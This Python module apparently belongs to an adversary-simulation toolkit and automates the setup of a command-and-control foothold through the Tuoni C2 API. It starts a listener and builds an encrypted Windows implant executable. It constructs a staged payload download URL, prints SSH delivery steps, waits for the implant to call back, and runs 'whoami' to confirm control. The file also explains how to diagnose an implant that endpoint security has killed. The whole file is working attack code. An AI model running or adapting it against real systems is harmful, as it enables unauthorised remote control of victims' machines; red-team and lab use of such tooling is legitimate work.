"""Initial compromise — the Tuoni-API half of a foothold. Talks ONLY to the Tuoni"""
import time
from urllib.parse import urlparse

from adsim.tuoni.common import (
    TuoniScriptError,
    active_agent_guids,
    authenticate,
    find_template,
)


def get_listener(c2, listener_id=None):
    print("[*] Fetching listeners...")
    raw = c2.request_get("/api/v1/listeners")
    listener_list = list(raw.values()) if isinstance(raw, dict) else raw

    if not listener_list:
        raise TuoniScriptError("No listeners found — create one in Tuoni first")

    if listener_id is not None:
        listener = next((l for l in listener_list if l["id"] == listener_id), None)
        if not listener:
            raise TuoniScriptError(f"Listener id={listener_id} not found")
    else:
        listener = listener_list[0]

    print(f"[*] Using listener id={listener['id']} name={listener['name']}")
    c2.request_put(f"/api/v1/listeners/{listener['id']}/start")

    l_detail = c2.request_get(f"/api/v1/listeners/{listener['id']}")
    l_cfg = l_detail.get("configuration", {})
    l_port = l_cfg.get("port")
    l_https = l_cfg.get("https", False)
    l_staged_uri = l_cfg.get("stagedUri", "/payload")
    l_staged_param = l_cfg.get("stagedUriPayloadId", "payloadId")
    l_callbacks = l_cfg.get("httpCallbacks") or []
    l_host = (l_callbacks[0].get("hosts") or [None])[0] if l_callbacks else None

    return listener, l_port, l_host, l_staged_uri, l_staged_param, l_https


def get_or_create_payload(c2, listener_id, template, payload_type):
    print("[*] Checking payloads...")
    raw = c2.request_get("/api/v1/payloads")
    payloads = raw.values() if isinstance(raw, dict) else raw
    payload = next(
        (p for p in payloads
         if p.get("templateId") == template
         and p.get("configuration", {}).get("type") == payload_type
         and p.get("status") == "ACTIVE"
         and listener_id in (p.get("listeners") or [])),
        None
    )

    if payload:
        print(f"[+] Reusing payload id={payload['id']} name={payload['name']}")
    else:
        print(f"[*] Creating new {template} {payload_type} payload for listener {listener_id}")
        body = {
            "payloadTemplateId": template,
            "configuration": {"type": payload_type, "initialWait": 5},
            "listenerId": listener_id,
            "encrypted": True,
        }
        payload = c2.request_post("/api/v1/payloads", json_data=body)
        print(f"[+] Payload created id={payload['id']}")

    return payload


def wait_for_payload_build(c2, payload_id, timeout=60):
    deadline = time.time() + timeout
    while time.time() < deadline:
        status = (c2.request_get(f"/api/v1/payloads/{payload_id}") or {}).get("status")
        if status == "ACTIVE":
            return
        print(f"    ... payload {payload_id} status={status}, waiting")
        time.sleep(3)
    print(f"[!] Payload {payload_id} not ACTIVE after {timeout}s — deliver at your own risk")


def wait_for_beacon(c2, pid=None, known_guids=frozenset(), timeout=120):
    print(f"\n[*] Waiting for the agent (pid={pid}) to beacon (up to {timeout}s)...")
    agents = []
    deadline = time.time() + timeout
    while time.time() < deadline:
        active = c2.load_agents(active=True)
        by_pid = [a for a in active
                  if pid and str((getattr(a, "metadata", None) or {}).get("pid")) == str(pid)]
        agents = by_pid or [a for a in active if a.guid not in known_guids]
        if agents:
            if not by_pid:
                print("    (matched by guid diff — no agent reported this pid)")
            break
        remaining = int(deadline - time.time())
        print(f"    ... not beaconing yet ({remaining}s remaining)")
        time.sleep(5)

    if not agents:
        print(f"[!] No agent beaconed within {timeout}s.")
        print("    deliver.py reports whether the process is alive on the target:\n"
              "      * process alive but no beacon -> it cannot reach the callback\n"
              "        host:port. Check the listener's httpCallbacks host.\n"
              "      * process dead after spawn    -> endpoint security (Defender).")
        raise TuoniScriptError(f"no agent beaconed within {timeout}s")

    if len(agents) > 1:
        print(f"[!] {len(agents)} candidate agents; taking the first")
    agent = agents[0]
    print(f"[+] Agent beaconed: guid={agent.guid}")
    return agent


def verify_with_whoami(c2, agent):
    print("\n[*] Sending whoami command...")
    try:
        tpl = find_template(c2, "cmd")
    except TuoniScriptError:
        print("[!] 'cmd' template not found — skipping verify")
        return None
    cmd_obj = agent.send_command(tpl, {"command": "whoami"})
    cmd_obj.wait_result(interval=2, maxWait=30)
    if cmd_obj.is_success():
        text = cmd_obj.get_result().get_text()
        print(f"[+] whoami: {text}")
        return text
    print("[!] whoami command failed")
    return None


def tuoni_prep(api=None, user=None, password=None, tuoni_host=None,
             listener_id=None, payload_id=None, target_ip=None, exec_user=None,
             payload_template="shelldot.payload.windows-x64", payload_type="EXECUTABLE"):
    c2 = authenticate(api, user, password)
    offender_ip = tuoni_host or (urlparse(api).hostname if api else None)

    listener, l_port, l_host, l_staged_uri, l_staged_param, l_https = get_listener(
        c2, listener_id)

    if l_host is None:
        l_host = offender_ip

    if payload_id:
        print(f"[+] Using caller-supplied payload id={payload_id}")
    else:
        payload_id = get_or_create_payload(c2, listener["id"], payload_template, payload_type)["id"]
    wait_for_payload_build(c2, payload_id)

    known = active_agent_guids(c2)
    scheme = "https" if l_https else "http"
    staged_url = f"{scheme}://{l_host}:{l_port}{l_staged_uri}?{l_staged_param}={payload_id}"

    print("\n[+] Foothold prepared (Tuoni API side). Deliver over SSH, then verify.")
    print(f"    PAYLOAD_ID   : {payload_id}")
    print(f"    Listener     : id={listener['id']} port={l_port} host={l_host}")
    print(f"    Staged URL   : {staged_url}")
    print(f"    Active guids : {','.join(sorted(known)) or '(none)'}")

    tgt = target_ip or "<ws-ip>"
    usr = exec_user or "<user>"
    known_arg = f" --known {','.join(sorted(known))}" if known else ""
    print("\n    2) deliver over SSH (deliver.py — the only script that touches the target):")
    print(f"       deliver.py --staged-url '{staged_url}' \\")
    print(f"         --target {tgt} --exec-user {usr} --exec-pass '<pw>'")
    print("\n    3) prove the callback over the API (deliver.py's 'process alive' is NOT this):")
    print(f"       manage.py --verify --pid <pid-deliver-printed>{known_arg}")

    return {
        "payload_id": payload_id,
        "listener_id": listener["id"],
        "port": l_port,
        "host": l_host,
        "staged_url": staged_url,
        "known_guids": sorted(known),
    }


def tuoni_verify(api=None, user=None, password=None, pid=None, known="", max_wait=120):
    c2 = authenticate(api, user, password)
    known_guids = (frozenset(g for g in known.split(",") if g)
                    if isinstance(known, str) else frozenset(known or ()))
    agent = wait_for_beacon(c2, pid=pid, known_guids=known_guids, timeout=max_wait)
    whoami = verify_with_whoami(c2, agent)
    print(f"\n[+] Foothold verified — agent {agent.guid} is beaconing.")
    return {"guid": agent.guid, "whoami": whoami}
